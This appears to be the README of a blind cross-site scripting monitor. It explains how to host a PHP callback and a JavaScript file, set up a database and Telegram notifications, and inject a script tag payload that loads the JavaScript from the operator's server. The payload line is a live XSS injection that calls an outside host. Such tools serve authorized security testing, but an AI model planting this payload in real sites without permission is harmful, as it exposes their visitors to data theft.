# XSS Monitor tool for OOB Blind-XSS

## How to install :

  1.Upload alert.php , eksss.js on your host
  
  2.change "https://YourSiteName.com/alert.php" in eksss.js to your host and path of PHP file and save it.
  
  3.open alert.php and set your information of Database config 

  ```php
      $servername = "localhost";
      $username = "UserDB_xss";
      $password = "PAS-DB";
      $dbname = "DB-name_monitor"
  ```

  4.set Telegram Bot information and ChatID Acount which you want to be notified :

  ```php
      $token = "**********Bot_Token***************";
      $chat_id = "****YourTelegramChatID";
  ```
      
  5.save alert.php 

## How to Use:

  use this payload for test :

          <script src=https://YourSiteName.com/eksss.js></script>
  
